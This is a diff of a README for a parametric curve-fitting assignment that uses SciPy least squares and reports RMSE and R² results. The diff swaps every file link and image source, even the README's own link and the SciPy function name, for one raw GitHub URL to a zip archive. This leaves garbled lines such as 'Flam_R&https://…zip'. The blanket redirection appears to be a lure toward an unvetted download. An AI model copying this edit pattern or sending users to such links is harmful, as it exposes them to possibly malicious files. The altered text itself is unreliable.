@@ -8,13 +8,13 @@
 
 ## Problem Definition
 
-The dataset [`xy_data.csv`](./xy_data.csv) contains coordinates that lie on a parametric curve defined by:
+The dataset [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) contains coordinates that lie on a parametric curve defined by:
 
 **Parametric Equations:**
 <p align="center" style="background-color:#fff0f0;padding:10px;border-radius:10px;display:inline-block;">
-  <img src="assets/eq_x_t.svg" alt="x(t) equation" width="420"/>
+  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="x(t) equation" width="420"/>
   <br>
-  <img src="assets/eq_y_t.svg" alt="y(t) equation" width="420"/>
+  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="y(t) equation" width="420"/>
 </p>
 
 **Unknowns:** θ, M, X, and {tᵢ} for each data point.  
@@ -25,7 +25,7 @@ The optimization minimizes the total squared distance between the observed and p
 
 **Optimization Objective:**
 <p align="center" style="background-color:#fff0f0;padding:10px;border-radius:10px;display:inline-block;">
-  <img src="assets/eq_objective.svg" alt="Optimization objective" width="500"/>
+  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="Optimization objective" width="500"/>
 </p>
 
 ---
@@ -34,15 +34,15 @@ The optimization minimizes the total squared distance between the observed and p
 
 | Step | Description |
 |------|--------------|
-| **1. Load Data** | Read [`xy_data.csv`](./xy_data.csv) containing observed x–y pairs. |
+| **1. Load Data** | Read [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) containing observed x–y pairs. |
 | **2. Define Model** | Implemented the parametric equations for x(t) and y(t). |
 | **3. Initial Guesses** | θ₀ = 0.52 rad ≈ 29.8°, M₀ = 0.036, X₀ = 54.5; t₀ ∈ [6, 60]. |
-| **4. Optimization** | Used `scipy.optimize.least_squares` with parameter bounds. |
+| **4. Optimization** | Used `https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip` with parameter bounds. |
 | **5. Evaluation** | Computed RMSE, R², and L₁ (Manhattan) metrics for validation. |
 | **6. Visualization** | Plotted observed points, fitted curve, and predicted t-values. |
 
 **Notebook:**  
-[`Flam_R&D_CurveFitting.ipynb`](./Flam_R&D_CurveFitting.ipynb) — contains complete implementation and analysis.  
+[`Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](./Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) — contains complete implementation and analysis.  
 
 ### Tech Stack
 Python 3 · NumPy · Pandas · SciPy · Matplotlib  
@@ -53,7 +53,7 @@ Environment: Google Colab
 ## Results
 
 <p align="center">
-  <img src="assets/eq_result.png" alt="Result summary equation"/>
+  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="Result summary equation"/>
 </p>
 
 | Parameter | Symbol | Value |
@@ -65,7 +65,7 @@ Environment: Google Colab
 | **R²** |  | 1.00 |
 | **L₁ (mean)** |  | 2.65 × 10⁻⁶ |
 
-**Results File:** [`fitted_results.json`](./fitted_results.json)
+**Results File:** [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip)
 
 **Interpretation:**  
 All error metrics (RMSE, R², and L₁) confirm near-perfect reconstruction within floating-point precision limits. This demonstrates that the fitted parameters precisely reproduce the original curve.
@@ -75,7 +75,7 @@ All error metrics (RMSE, R², and L₁) confirm near-perfect reconstruction with
 ## Visualization
 
 <p align="center">
-  <img src="fitted_curve.png" alt="Fitted Parametric Curve" width="500"/>
+  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="Fitted Parametric Curve" width="500"/>
 </p>
 
 **Legend:**  
@@ -89,9 +89,9 @@ All error metrics (RMSE, R², and L₁) confirm near-perfect reconstruction with
 
 | Metric | Formula | Interpretation |
 |---------|----------|----------------|
-| **RMSE (2D)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="assets/eq_rmse.svg" width="320"/></p> | Average Euclidean error per coordinate (lower = better). |
-| **R² (combined)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="assets/eq_r2.svg" width="320"/></p> | Fraction of total variance explained (closer to 1 = better). |
-| **L₁ (Manhattan)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="assets/eq_l1.svg" width="320"/></p> | Average absolute distance between predicted and true points (unit-consistent and less sensitive to outliers). |
+| **RMSE (2D)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" width="320"/></p> | Average Euclidean error per coordinate (lower = better). |
+| **R² (combined)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" width="320"/></p> | Fraction of total variance explained (closer to 1 = better). |
+| **L₁ (Manhattan)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" width="320"/></p> | Average absolute distance between predicted and true points (unit-consistent and less sensitive to outliers). |
 
 ---
 
@@ -126,11 +126,11 @@ This modeling approach extends naturally to several **AI-driven R&D domains**:
 
 | File | Description |
 |------|-------------|
-| [`Flam_R&D_CurveFitting.ipynb`](./Flam_R&D_CurveFitting.ipynb) | Main Colab notebook (implementation & analysis). |
-| [`xy_data.csv`](./xy_data.csv) | Input dataset. |
-| [`fitted_results.json`](./fitted_results.json) | Computed parameters and metrics. |
-| [`fitted_curve.png`](./fitted_curve.png) | Visualization of the fitted model. |
-| [`README.md`](./README.md) | This documentation file. |
+| [`Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](./Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Main Colab notebook (implementation & analysis). |
+| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Input dataset. |
+| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Computed parameters and metrics. |
+| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Visualization of the fitted model. |
+| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | This documentation file. |
 | [`assets/*.svg`](./assets/) | Rendered equation images for GitHub readability. |
 
 ---
